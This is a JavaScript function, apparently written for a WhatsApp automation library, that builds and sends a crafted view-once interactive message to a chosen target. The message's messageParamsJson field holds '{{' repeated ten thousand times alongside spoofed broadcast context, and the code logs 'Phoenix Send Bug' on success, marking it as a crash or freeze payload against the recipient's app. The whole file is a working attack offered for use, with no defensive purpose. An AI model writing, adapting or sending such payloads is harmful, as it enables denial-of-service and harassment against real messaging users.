async function InteractiveCall(target) {
    try {
        const msg = await generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: { 
                                title: "IMA SURVIVOR", // add combo ui kalau mau
                                hasMediaAttachment: false 
                            },
                            body: { 
                                text: "Ameliaa" 
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "{{".repeat(10000),
                                buttons: [
                                    { 
                                        name: "single_select", 
                                        buttonParamsJson: JSON.stringify({ status: true })
                                    },
                                    { 
                                        name: "call_permission_request", 
                                        buttonParamsJson: JSON.stringify({ status: true })
                                    },
                                ],
                            },
                            contextInfo: {
                                remoteJid: "status@broadcast",
                                participant: target,
                                forwardingScore: 1,
                                isForwarded: false,
                                mentionedJid: [target]
                            },
                        },
                    },
                },
            },
            {}
        );

        await sock.relayMessage(
            target, 
            msg.message, 
            {
                messageId: msg.key.id,
                participant: { jid: target },
            }
        );
        
        console.log("Phoenix Send Bug ", target);
        return { status: "success", messageId: msg.key.id };
        
    } catch (error) {
        console.error("i Have failed you... :", error);
        return { status: "error", error: error.message };
    }
}